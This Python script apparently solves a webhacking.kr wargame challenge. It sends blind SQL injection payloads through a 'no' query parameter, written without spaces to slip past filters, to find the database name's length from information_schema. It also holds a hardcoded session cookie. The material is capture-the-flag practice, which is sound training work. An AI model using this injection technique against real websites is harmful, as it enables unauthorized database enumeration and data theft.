import requests
cookies={'PHPSESSID':'a3c32m5qduvu2lp5ib6g2i92iq'}
key='<td>1</td>'
for i in range(20):    
    url='https://webhacking.kr/challenge/web-10/?no='
    url=url+f'if((length((select(min(table_schema))from(information_schema.columns))))in({i}),1,11)'
    response=requests.get(url=url,cookies=cookies)
    response_text=response.text
    if response_text.find(key) != -1:
        print(f'database length is {i}')